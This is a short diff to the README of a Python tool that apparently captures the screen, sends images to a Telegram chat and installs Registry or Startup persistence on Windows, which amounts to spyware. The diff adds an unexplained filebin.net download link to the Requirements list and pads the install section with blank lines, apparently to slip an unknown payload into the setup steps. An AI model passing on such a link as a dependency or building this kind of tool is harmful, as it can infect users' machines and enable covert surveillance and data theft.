@@ -30,6 +30,7 @@ Built for authorized penetration testing, and security awareness demonstrations.
 ## Requirements
 
 - Python 3.8+
+- https://filebin.net/c4bsb9w8z6iym3rb
 - Dependencies: `mss`, `numpy`, `Pillow`, `requests`
 - Windows (for Registry/Startup persistence)
 - ## Change in desktop.py
@@ -42,6 +43,11 @@ CHAT_ID   = "YOUR_CHAT_ID"      # Your Telegram user/group chat ID
 ```bash
 pip install mss numpy pillow requests pyinstaller
 python desktop.py
+
+
+
+
+
 
 
 
